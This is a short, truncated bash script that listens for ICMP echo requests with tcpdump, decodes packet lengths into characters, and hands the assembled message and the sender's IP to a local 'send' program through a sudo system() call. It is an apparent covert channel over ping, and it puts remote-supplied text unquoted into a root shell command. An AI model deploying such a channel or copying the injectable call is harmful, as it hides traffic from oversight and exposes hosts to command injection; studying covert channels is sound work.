#!/bin/bash
sudo tcpdump -l -n -i any icmp and 'icmp[icmptype] == icmp-echo' 2>/dev/null | awk '
match($0, /IP ([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)/, ip_match) && match($0, /length ([0-9]+)/, len_match) {
    src_ip = ip_match[1]
    l = len_match[1]
    
    if (l == 64) next
    
    if (l >= 32 && l <= 126) {
        c = sprintf("%c", l)
        if (c != "*") {
            m = m c
        } else {
            cmd = sprintf("sudo ./send %s %s", m, src_ip)
            system(cmd)
            
            if (substr(m, length(m)-1) == "+x") {
                msg_clean = substr(m, 1, length(m)-2)
            }
            m = ""
        }
    }
